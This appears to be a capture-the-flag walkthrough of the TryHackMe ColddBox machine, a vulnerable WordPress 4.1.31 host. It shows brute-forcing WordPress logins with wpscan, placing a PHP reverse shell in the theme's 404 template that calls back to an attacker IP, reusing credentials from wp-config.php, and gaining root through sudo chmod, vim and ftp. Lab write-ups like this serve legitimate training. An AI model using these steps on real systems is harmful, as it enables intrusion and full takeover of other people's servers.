# TryHackMe — ColddBox: Easy Walkthrough

**Difficulty:** Easy  
**OS:** Linux (Ubuntu)  
**Techniques:** WordPress Enumeration, WPScan Brute Force, PHP Reverse Shell, wp-config.php Credential Reuse, SUID Privilege Escalation via chmod

---

## Table of Contents
1. [Reconnaissance](#1-reconnaissance)
2. [Web Enumeration](#2-web-enumeration)
3. [Username Discovery](#3-username-discovery)
4. [WordPress Brute Force](#4-wordpress-brute-force)
5. [Initial Access — PHP Reverse Shell](#5-initial-access--php-reverse-shell)
6. [Lateral Movement — www-data to c0ldd](#6-lateral-movement--www-data-to-c0ldd)
7. [Privilege Escalation — SUID via chmod](#7-privilege-escalation--suid-via-chmod)
8. [Flags](#8-flags)

---

## 1. Reconnaissance

Added the target to `/etc/hosts`:

```bash
echo "10.64.170.226  coldbox.thm" | sudo tee -a /etc/hosts
```

Ran an nmap scan:

```bash
nmap -v -sC -sV -oN ./nmap/initial coldbox.thm
```

**Results:**

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.1.31
```

Only port 80 open — a WordPress site running version **4.1.31**, an outdated and vulnerable version.

---

## 2. Web Enumeration

Ran directory enumeration with gobuster:

```bash
gobuster dir -u http://coldbox.thm \
             -w /usr/share/seclists/Discovery/Web-Content/common.txt \
             -t 50
```

**Results:**

```
/hidden     (Status: 301)
/wp-admin   (Status: 301)
/wp-content (Status: 301)
/wp-includes (Status: 301)
/xmlrpc.php (Status: 200)
```

Notable findings:
- `/wp-admin` — WordPress login panel
- `/hidden` — custom directory (unusual, worth investigating)
- `xmlrpc.php` — enabled, can be abused for brute force

Also confirmed WordPress version via RSS feed at `/?feed=rss2`:

```xml
<generator>https://wordpress.org/?v=4.1.31</generator>
<dc:creator>the cold in person</dc:creator>
```

The RSS feed also leaked the author display name.

---

## 3. Username Discovery

Navigating to `http://coldbox.thm/hidden/` revealed a message left by an administrator:

```
U-R-G-E-N-T

C0ldd, you changed Hugo's password, when you can send it to him
so he can continue uploading his articles. Philip
```

This reveals **three valid usernames**: `c0ldd`, `hugo`, `philip`.

> **Key lesson:** Always check non-standard directories. This message was left as an internal note but exposed the full user list to any visitor.

---

## 4. WordPress Brute Force

Used `wpscan` to brute force all three discovered usernames against the WordPress login:

```bash
wpscan --url http://coldbox.thm \
       --usernames c0ldd,hugo,philip \
       --passwords /usr/share/wordlists/rockyou.txt \
       --max-threads 50
```

**Result:**

```
[SUCCESS] - c0ldd / 9876543210
```

Logged into `/wp-admin` as `c0ldd`.

---

## 5. Initial Access — PHP Reverse Shell

With admin access to the WordPress dashboard, injected a PHP reverse shell into the theme editor.

**Path:** Appearance → Editor → 404 Template (`404.php`)

Replaced the content with the pentestmonkey PHP reverse shell, setting the attacker IP and port:

```php
$ip = '192.168.132.14';
$port = 4444;
```

Started a netcat listener:

```bash
nc -lnvp 4444
```

Triggered the shell by visiting:

```
http://coldbox.thm/wp-content/themes/twentyfifteen/404.php
```

Received a connection as `www-data`.

Stabilised the shell with Python:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

> **How it works:** WordPress allows admin users to directly edit theme PHP files. By replacing `404.php` with a reverse shell, any direct visit to the file executes the PHP payload. The web server process (`www-data`) runs the code and connects back to the attacker's listener.

---

## 6. Lateral Movement — www-data to c0ldd

As `www-data`, direct access to `/home/c0ldd/user.txt` was denied due to file permissions.

The WordPress configuration file always contains database credentials in plaintext:

```bash
cat /var/www/html/wp-config.php
```

**Found:**

```php
define('DB_USER', 'c0ldd');
define('DB_PASSWORD', 'cybersecurity');
```

Tried this password for the system user `c0ldd`:

```bash
su c0ldd
# password: cybersecurity
```

Success — the database password was reused as the Linux user password.

```bash
cat /home/c0ldd/user.txt
# RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==
```

> **Note:** The flag is base64-encoded. Decoded: `Felicidades, primer nivel conseguido!`

---

## 7. Privilege Escalation — SUID via chmod

Checked sudo privileges:

```bash
sudo -l
```

**Output:**

```
User c0ldd may run the following commands:
    (root) /usr/bin/vim
    (root) /bin/chmod
    (root) /usr/bin/ftp
```

Three possible vectors. The simplest is `chmod` — used it to add the SUID bit to `/bin/bash`:

```bash
sudo /bin/chmod +s /bin/bash
/bin/bash -p
```

```bash
whoami
# root

cat /root/root.txt
# wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=
```

> **How it works:** `chmod +s` sets the **SUID bit** on bash. When a binary has the SUID bit set, it executes with the permissions of the file owner (root) rather than the user running it. The `-p` flag tells bash not to drop those elevated privileges.

> **Alternative vectors documented on [GTFOBins](https://gtfobins.github.io):**
> - `vim`: `sudo vim -c ':!/bin/bash'`
> - `ftp`: `sudo ftp` → then type `!/bin/bash` at the ftp prompt

---

## 8. Flags

| Flag | Value (base64) | Decoded |
|------|---------------|---------|
| User | `RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==` | Felicidades, primer nivel conseguido! |
| Root | `wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=` | ¡Felicidades, máquina completada! |

---

## Attack Chain Summary

```
nmap → WordPress 4.1.31 on port 80
        ↓
gobuster → /hidden directory
        ↓
/hidden → usernames: c0ldd, hugo, philip
        ↓
wpscan brute force → c0ldd / 9876543210
        ↓
WordPress admin → Theme Editor → 404.php
        ↓
PHP reverse shell → www-data shell
        ↓
wp-config.php → DB_PASSWORD: cybersecurity
        ↓
su c0ldd (password reuse) → user flag
        ↓
sudo -l → (root) /bin/chmod
        ↓
chmod +s /bin/bash → /bin/bash -p → root
```

---

## Key Concepts

- **WordPress Theme Editor RCE:** Admin access to WordPress allows direct PHP code execution via the theme file editor
- **wp-config.php credential exposure:** The WordPress config file always stores database credentials in plaintext; readable by `www-data`
- **Credential reuse:** Database passwords are frequently reused as system user passwords
- **SUID bit abuse:** Setting the SUID bit on bash via sudo-allowed `chmod` grants a permanent root shell; `-p` prevents privilege dropping
- **GTFOBins:** Reference for Unix binaries abusable for privilege escalation — `vim`, `ftp`, and `chmod` all have documented escalation paths
